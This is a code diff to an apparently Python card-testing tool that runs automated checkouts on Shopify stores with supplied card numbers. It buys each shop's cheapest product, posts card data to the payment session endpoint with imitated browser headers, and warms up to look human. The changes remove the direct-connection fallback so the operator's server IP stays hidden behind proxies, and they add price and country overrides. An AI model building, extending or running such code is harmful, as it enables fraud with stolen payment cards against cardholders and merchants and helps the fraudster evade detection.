@@ -228,7 +228,7 @@ _CATALOG_MAX_BACKOFF = 8.0                 # s, cap for exponential backoff
 _CATALOG_JITTER = 0.4                      # ±40% jitter on delays
 _CATALOG_RATELIMIT_COOLDOWN = 60           # s, temporary per-shop cooldown
 _CATALOG_WARMUP = True                     # homepage warm-up before scanning
-_CATALOG_DIRECT_FALLBACK = True            # proxy-429/blocked -> direct public catalog read
+_CATALOG_DIRECT_FALLBACK = False           # NEVER read the catalog direct (VPS IP must not be exposed)
 _MIN_CHECKOUT_AMOUNT = 0.50                # skip prices below this (avoid TOO_LOW_AMOUNT)
 _CATALOG_GRAPHQL_FALLBACK = True           # storefront GraphQL as a fallback
 _CATALOG_GRAPHQL_FIRST = False             # direct first (fast/reliable), GraphQL when /products.json is throttled
@@ -997,31 +997,6 @@ async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     break
                 await asyncio.sleep(0.5 * (attempt + 1) + random.uniform(0, 0.2))
 
-        # proxy path failed -> retry the first endpoint direct (no-proxy)
-        if not (200 <= last_status < 300) and proxy_url:
-            session.proxies = {}
-            for ep in candidates[:1]:
-                origin = ep.rsplit("/sessions", 1)[0]
-                hdrs = {
-                    "accept":               "application/json",
-                    "accept-language":      "en-US,en;q=0.9",
-                    "content-type":         "application/json",
-                    "origin":               origin,
-                    "priority":             "u=1, i",
-                    "referer":              f"{origin}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
-                    "sec-fetch-dest":       "empty",
-                    "sec-fetch-mode":       "cors",
-                    "sec-fetch-site":       "same-origin",
-                    "sec-fetch-storage-access": "active",
-                    "shopify-identification-signature": ident_sig,
-                }
-                for attempt in range(2):
-                    resp = await session.post(ep, data=payload, headers=hdrs, timeout=12)
-                    last_status, last_body = resp.status_code, resp.text
-                    if 200 <= last_status < 300:
-                        _VAULT_CACHE[scope] = ep
-                        return last_status, last_body
-                    await asyncio.sleep(0.6 * (attempt + 1))
     return last_status, last_body
 
 
@@ -1906,9 +1881,10 @@ async def human_warmup_async(client, shop_url: str, variant_id: str,
 
 
 async def run_checkout_for_card_async(shop_url: str, card_entry: str,
-                                      proxy_url: str = "") -> CheckResult:
+                                      proxy_url: str = "", min_price: float = 0.50,
+                                      country_override: str = "") -> CheckResult:
     currency  = "USD"
-    country   = "US"
+    country   = country_override or "US"
     site_name = shop_url.replace("https://", "").replace("http://", "")
 
     result = CheckResult(card=card_entry, shop_url=shop_url,
@@ -1929,11 +1905,13 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
     tracker = Tracker(client, shop_url)
     try:
         currency, country = await fetch_shop_currency(client, shop_url)
+        if country_override:
+            country = country_override
         result.currency = currency
         # Step 0 - Find cheapest product (0.01$ to 20$): all pages in parallel
         try:
             title, product_id, product_handle, variant_id, price = await find_cheapest_product(
-                client, shop_url, logger=logger
+                client, shop_url, min_price=min_price, logger=logger
             )
             _ = title
             tracker.set_item(variant_id, product_id, price)
